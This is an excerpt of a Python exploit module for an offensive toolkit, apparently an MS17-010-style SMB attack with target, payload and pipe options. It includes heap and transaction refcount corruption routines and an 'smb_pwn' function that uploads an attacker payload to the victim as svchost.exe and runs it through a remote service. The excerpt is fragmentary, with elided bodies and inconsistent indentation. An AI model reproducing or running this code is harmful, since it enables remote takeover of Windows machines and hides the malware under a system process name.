...
from support.mysmb import MYSMB
...
'''                                                           #what is the 'information' or 'README'
    ...
    option_list=["target","payload","pipe_name"]            #a list of all possible options

    target=setting("target","192.168.0.0",True,"Target IP address")
    payload=setting("payload","/payloads/payload.exe",True,"Payload to upload")
    pipe_name=setting("pipe_name","",False,"browser, spoolss, netlogon, lsarpc, samr")
...
#if exploit fails without creds, try with creds
USERNAME = ''
PASSWORD = ''
...
in this private heap should be very easy and very reliable. The drawback
...
def exploit_matched_pairs(conn, pipe_name, info):
	...
	# exploit set refCnt on leaked transaction to very large number for reading data repeatly
...
def exploit_fish_barrel(conn, pipe_name, info):
	...
	# modify transaction RefCount to keep controlled and reuse transaction after leaking info.
...
def exploit(target, pipe_name, payload):
	conn = MYSMB(target)
	...
	# ================================	
	try:
		smb_pwn(conn, info['arch'], info['os'], payload)
	except:
		pass
...
def smb_pwn(conn, arch, os, payload):
	smbConn = conn.get_smbconnection()

	
        if os == 'WIN2K':
            print('uploading to c:\winnt\svchost.exe')
            smb_send_file(smbConn, payload, 'C', '/winnt/svchost.exe')
#            service_exec(conn, r'cmd /c c:\winnt\svchost.exe')
            service_exec(conn, r'c:\winnt\svchost.exe')
        else:
            print('uploading payload as c:\windows\svchost.exe')
            smb_send_file(smbConn, payload, 'C', '/windows/svchost.exe')
            service_exec(conn, r'cmd /c c:\windows\svchost.exe')
#            service_exec(conn, r'c:\windows\svchost.exe')
